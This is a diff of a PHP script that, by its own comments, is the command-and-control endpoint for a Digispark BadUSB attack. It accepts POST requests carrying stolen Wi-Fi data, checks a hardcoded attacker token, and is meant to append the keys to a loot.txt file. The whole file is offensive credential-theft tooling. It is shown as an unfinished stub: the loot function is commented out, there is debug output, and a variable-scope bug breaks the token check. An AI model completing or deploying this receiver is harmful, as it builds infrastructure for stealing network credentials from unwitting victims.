@@ -1,3 +1,5 @@
+<?php
+
 /*
 Copyright (c) 2019 Hassan Shehata
 Permission is hereby granted, free of charge, 
@@ -8,18 +10,37 @@ publish, distribute, sublicense, and/or sell copies of the Software,
 and to permit persons to whom the Software is furnished to do so
 */
 
-## This script handles collected wifi data 
-## It verifies the request with pre-shared token "Hardcoded by the attacker into the Digispark"
-## Then append the result to loot.txt file on the CnC system 
+//This script handles collected wifi data 
+//It verifies the request with pre-shared token "Hardcoded by the attacker into the Digispark"
+//Then append the result to loot.txt file on the CnC system 
 
-### Handing POST Request
+//Verify on POST paramter token
+function verfiy($r_token,$data){
+	//testing
+	echo "Token is >> ". $r_token. "\n";
+	if ($r_token == $token) {
+	//	loot($data);
+		//testing
+		echo "Token valid looting...";
+	} else {
+	//	error();
+		//testing
+		echo "Token invalid dropping...";
+	}
+}
 
+//Open loot file append mode only and write the keys paramter
+/*function loot($data){
+	// write to loot.txt
+}*/
 
-### Initialize Token (32 digit)
-$token="1s5d47s98qwASDaw598wD51Dfg47m85C"; 
+$token="1s5d47s98qwASDaw598wD51Dfg47m85C"; //Initialize Token (32 digit) 
+$data=""; //will contain the collected wifi data
 
+// Request Handling
+if( $_POST["token"] && $_POST["data"] ) {
+	verfiy($_POST['token'],$_POST['data']);
+  exit();
+}
 
-### Verify on POST paramter token
-
-
-### Open loot file append mode only and write the keys paramter
+?>
